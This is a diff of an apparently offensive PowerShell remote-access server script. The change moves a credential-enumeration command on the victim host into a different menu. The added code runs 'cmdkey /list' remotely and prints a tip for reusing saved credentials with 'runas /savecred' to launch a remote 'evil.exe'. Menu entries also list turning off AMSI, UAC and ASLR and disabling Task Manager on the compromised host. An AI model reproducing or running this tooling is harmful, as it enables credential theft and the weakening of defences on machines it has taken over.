@@ -397,7 +397,6 @@ While($Client.Connected)
       write-host "   ListPriv  List Remote-Host Folder Permitions";
       write-host "   ListDriv  List Remote-Host Drives Available";
       write-host "   ListRun   List Remote-Host Startup Run Entrys";
-      write-host "   ListCred  List Remote-Host cmdkey stored creds";
       write-host "   ListProc  List Remote-Host Processe(s) Running";
       write-host "   ListConn  List Remote-Host Active TCP Connections";
       write-host "   ListIpv4  List Remote-Host IPv4 Network Statistics";
@@ -492,13 +491,6 @@ While($Client.Connected)
       {
         write-host " List of Remote-Host Drives Available." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Name,Provider,Root|Format-Table `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
-      }
-      If($choise -eq "ListCred" -or $choise -eq "cred")
-      {
-        write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " Attacker can then use runas with the /savecred options in order to use the saved creds." -ForegroundColor Green;
-        write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n`n";
-        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt;If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "StartUp" -or $choise -eq "start")
       {
@@ -789,6 +781,7 @@ While($Client.Connected)
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
       write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User OR Admin Priv Required";
+      write-host "   cmdCred   List cmdkey stored creds        Client:User  - Privileges Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
       write-host "   TaskMan   Turn On/off TaskManager         Client:Admin - Privileges Required";
@@ -1021,6 +1014,13 @@ While($Client.Connected)
           $choise_two = $Null;
         }
         $choise_two = $Null;
+      }
+      If($choise -eq "CmdCred" -or $choise -eq "cred")
+      {
+        write-host " List of Remote-Host cmdkey stored Credentials." -ForegroundColor Blue -BackgroundColor White;
+        write-host " Attacker can then use runas with the /savecred options in order to use the saved creds." -ForegroundColor Green;
+        write-host " runas /savecred /user:WORKGROUP\Administrator `"\\10.XXX.XXX.XXX\SHARE\evil.exe`"" -ForegroundColor Green;Start-Sleep -Seconds 2;write-host "`n`n";
+        $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt;If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "UACSet" -or $choise -eq "uac")
       {
